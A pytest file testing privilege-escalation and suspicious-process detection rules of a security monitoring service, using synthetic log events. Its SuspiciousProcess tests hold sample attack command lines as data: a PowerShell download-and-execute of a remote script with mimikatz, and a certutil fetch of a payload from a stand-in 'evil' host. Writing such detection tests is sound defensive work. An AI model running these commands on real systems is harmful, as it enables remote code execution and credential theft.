"""Tests for PrivilegeEscalation and SuspiciousProcess rules."""

from datetime import datetime, timedelta, timezone

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, select
from sqlalchemy.orm import Session, sessionmaker
from sqlalchemy.pool import StaticPool
from sqlalchemy import event as sa_event

from app.db.base import Base
from app.db.session import get_db
from app.main import create_app
from app.models.event import Event
from app.models.detection_rule import DetectionRule
from app.services.detection import DetectionService, ensure_default_rules
from app.detection.engine import DetectionEngine
from app.detection.registry import rule_registry
from app.detection.rules.brute_force import BruteForceLoginRule
from app.detection.rules.error_spike import ErrorSpikeRule
from app.detection.rules.port_scan import PortScanRule
from app.detection.rules.web_scan import WebScanRule
from app.detection.rules.authentication_anomaly import AuthenticationAnomalyRule
from app.detection.rules.sql_injection import SQLInjectionRule
from app.detection.rules.xss_attempt import XSSAttemptRule
from app.detection.rules.malware_detection import MalwareDetectionRule
from app.detection.rules.privilege_escalation import PrivilegeEscalationRule
from app.detection.rules.suspicious_process import SuspiciousProcessRule

BASE = datetime(2026, 9, 14, 10, 0, 0, tzinfo=timezone.utc)


def _register_all(db_session):
    rule_registry.clear_all()
    rule_registry.register_class("threshold", BruteForceLoginRule)
    rule_registry.register_class("frequency", ErrorSpikeRule)
    rule_registry.register_class("port_scan", PortScanRule)
    rule_registry.register_class("web_scan", WebScanRule)
    rule_registry.register_class("authentication_anomaly", AuthenticationAnomalyRule)
    rule_registry.register_class("sql_injection", SQLInjectionRule)
    rule_registry.register_class("xss_attempt", XSSAttemptRule)
    rule_registry.register_class("malware_detection", MalwareDetectionRule)
    rule_registry.register_class("privilege_escalation", PrivilegeEscalationRule)
    rule_registry.register_class("suspicious_process", SuspiciousProcessRule)
    for rm in db_session.execute(select(DetectionRule)).scalars().all():
        cls = rule_registry.get_class(rm.rule_type)
        if cls:
            inst = cls(config=rm.config)
            inst.name = rm.name
            rule_registry.register_instance(rm.name, inst)


@pytest.fixture()
def db_session():
    engine = create_engine("sqlite:///:memory:", connect_args={"check_same_thread": False}, poolclass=StaticPool)

    @sa_event.listens_for(engine, "connect")
    def fk_on(dbapi_conn, conn_rec):
        cur = dbapi_conn.cursor()
        cur.execute("PRAGMA foreign_keys=ON")
        cur.close()

    TestingSession = sessionmaker(bind=engine, autoflush=False, autocommit=False)
    Base.metadata.create_all(bind=engine)
    session = TestingSession()
    ensure_default_rules(session)
    _register_all(session)
    try:
        yield session
    finally:
        session.close()
        Base.metadata.drop_all(bind=engine)
        engine.dispose()
        rule_registry.clear_all()


@pytest.fixture()
def client(db_session):
    app = create_app()

    def override_get_db():
        yield db_session

    app.dependency_overrides[get_db] = override_get_db
    with TestClient(app) as c:
        _register_all(db_session)
        yield c
    app.dependency_overrides.clear()
    rule_registry.clear_all()


def insert_events(db: Session, events_data: list[dict]) -> list[Event]:
    evs = []
    for d in events_data:
        e = Event(**d)
        db.add(e)
        evs.append(e)
    db.commit()
    for e in evs:
        db.refresh(e)
    return evs


def ev(ts, extra=None, message="security event", source="iam", host="web-01"):
    return {
        "timestamp": ts,
        "source": source,
        "level": "WARNING",
        "message": message,
        "raw_log": "raw",
        "extra_data": extra,
        "host": host,
    }


def scan(db_session, rule_name, **kwargs):
    engine = DetectionEngine()
    results = engine.scan_recent(db=db_session, **kwargs)
    return [r for r in results if r["rule_model"].name == rule_name]


class TestPrivilegeEscalation:
    def test_explicit_sudo_action(self, db_session):
        evs = insert_events(
            db_session,
            [ev(BASE, extra={"action": "sudo", "actor": "jdoe", "target_user": "jdoe"})],
        )
        matches = scan(db_session, "PrivilegeEscalation", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        assert len(matches) == 1
        m = matches[0]["match"]
        assert m.context["rule_type"] == "privilege_escalation"
        assert m.context["indicator"] == "explicit-action"
        assert m.context["subject"] == "jdoe"
        assert sorted(m.evidence_event_ids) == sorted(e.id for e in evs)
        assert matches[0]["rule_model"].severity == "HIGH"
        assert "Privilege escalation pattern detected" in m.summary

    def test_role_transition_to_admin(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, extra={"old_role": "developer", "new_role": "Domain Admins", "target_user": "svc-deploy"})],
        )
        matches = scan(db_session, "PrivilegeEscalation", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        assert len(matches) == 1
        assert matches[0]["match"].context["detail"] == "developer->domain admins"

    def test_non_privileged_transition_no_trigger(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, extra={"old_role": "developer", "new_role": "senior developer", "target_user": "alice"})],
        )
        matches = scan(db_session, "PrivilegeEscalation", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        assert len(matches) == 0

    def test_same_role_no_trigger(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, extra={"old_role": "admin", "new_role": "Admin", "target_user": "bob"})],
        )
        matches = scan(db_session, "PrivilegeEscalation", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        assert len(matches) == 0

    def test_message_only_no_trigger(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, message="jdoe used sudo to restart nginx", extra=None)],
        )
        matches = scan(db_session, "PrivilegeEscalation", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        assert len(matches) == 0

    def test_outside_window(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, extra={"action": "sudo", "target_user": "carol"})],
        )
        matches = scan(db_session, "PrivilegeEscalation", window_seconds=60, evaluation_time=BASE + timedelta(seconds=3600))
        assert len(matches) == 0

    def test_missing_fields_no_crash(self, db_session):
        insert_events(
            db_session,
            [
                ev(BASE, extra=None),
                ev(BASE, extra="oops"),
                ev(BASE, extra={"action": 123}),
                ev(BASE, extra={"old_role": None, "new_role": None}),
            ],
        )
        matches = scan(db_session, "PrivilegeEscalation", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        assert len(matches) == 0

    def test_subject_falls_back_to_host(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, host="srv-09", extra={"action": "became_root"})],
        )
        matches = scan(db_session, "PrivilegeEscalation", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        assert len(matches) == 1
        assert matches[0]["match"].context["subject"] == "host:srv-09"

    def test_cooldown_dedup(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, extra={"action": "sudo", "target_user": "dave"})],
        )
        svc = DetectionService(engine=DetectionEngine())
        first = svc.run_detection(db=db_session, window_seconds=300, evaluation_time=BASE + timedelta(seconds=60), rule_names=["PrivilegeEscalation"])
        assert len(first) == 1
        second = svc.run_detection(db=db_session, window_seconds=300, evaluation_time=BASE + timedelta(seconds=61), rule_names=["PrivilegeEscalation"])
        assert len(second) == 0


class TestSuspiciousProcess:
    def test_plain_powershell_no_trigger(self, db_session):
        insert_events(
            db_session,
            [
                ev(BASE + timedelta(seconds=i), source="edr", extra={"process": "powershell.exe", "command": "Get-Service", "user": "admin"}, host="ws-01")
                for i in range(5)
            ],
        )
        matches = scan(db_session, "SuspiciousProcess", window_seconds=300, evaluation_time=BASE + timedelta(seconds=300))
        assert len(matches) == 0

    def test_explicit_verdict(self, db_session):
        evs = insert_events(
            db_session,
            [ev(BASE, source="edr", extra={"process": "powershell.exe", "verdict": "suspicious"}, host="ws-02")],
        )
        matches = scan(db_session, "SuspiciousProcess", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        assert len(matches) == 1
        m = matches[0]["match"]
        assert m.context["rule_type"] == "suspicious_process"
        assert m.context["indicator"] == "explicit-verdict"
        assert sorted(m.evidence_event_ids) == sorted(e.id for e in evs)
        assert matches[0]["rule_model"].severity == "HIGH"
        assert "Suspicious process execution" in m.summary

    def test_office_spawned_shell(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, source="edr", extra={"process": "powershell.exe", "parent_process": "winword.exe"}, host="ws-03")],
        )
        matches = scan(db_session, "SuspiciousProcess", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        assert len(matches) == 1
        assert matches[0]["match"].context["indicator"] == "office-spawned-shell"

    def test_encoded_with_adversarial_keyword(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, source="edr", extra={"process": "cmd.exe", "parent_process": "explorer.exe", "command": "powershell -enc aQBmACgAWwBJAG4AHQAUAB0AHIAXQA="}, host="ws-04")],
        )
        matches = scan(db_session, "SuspiciousProcess", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        # encoded marker alone with benign parent and no keywords -> no fire
        assert len(matches) == 0

    def test_mimikatz_without_encoded_marker_no_trigger(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, source="edr", extra={"process": "powershell.exe", "parent_process": "explorer.exe", "command": "IEX (New-Object Net.WebClient).DownloadString('http://evil/x'); mimikatz"}, host="ws-05")],
        )
        matches = scan(db_session, "SuspiciousProcess", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        # no encoded marker -> DownloadString alone is not in LOLBIN list for powershell; mimikatz keyword alone needs encoded marker
        assert len(matches) == 0

    def test_lolbin_download(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, source="edr", extra={"process": "certutil.exe", "command": "certutil -urlcache -f http://evil/payload.exe"}, host="ws-06")],
        )
        matches = scan(db_session, "SuspiciousProcess", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        assert len(matches) == 1
        assert matches[0]["match"].context["indicator"] == "lolbin-download"

    def test_missing_process_no_trigger(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, source="edr", extra={"command": "mimikatz", "verdict": "malicious"})],
        )
        matches = scan(db_session, "SuspiciousProcess", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        assert len(matches) == 0

    def test_missing_fields_no_crash(self, db_session):
        insert_events(
            db_session,
            [
                ev(BASE, extra=None),
                ev(BASE, extra="oops"),
                ev(BASE, extra={"process": 123}),
            ],
        )
        matches = scan(db_session, "SuspiciousProcess", window_seconds=300, evaluation_time=BASE + timedelta(seconds=60))
        assert len(matches) == 0

    def test_outside_window(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, source="edr", extra={"process": "powershell.exe", "verdict": "malicious"}, host="ws-07")],
        )
        matches = scan(db_session, "SuspiciousProcess", window_seconds=60, evaluation_time=BASE + timedelta(seconds=3600))
        assert len(matches) == 0

    def test_cooldown_dedup(self, db_session):
        insert_events(
            db_session,
            [ev(BASE, source="edr", extra={"process": "cmd.exe", "verdict": "blocked"}, host="ws-08")],
        )
        svc = DetectionService(engine=DetectionEngine())
        first = svc.run_detection(db=db_session, window_seconds=300, evaluation_time=BASE + timedelta(seconds=60), rule_names=["SuspiciousProcess"])
        assert len(first) == 1
        second = svc.run_detection(db=db_session, window_seconds=300, evaluation_time=BASE + timedelta(seconds=61), rule_names=["SuspiciousProcess"])
        assert len(second) == 0
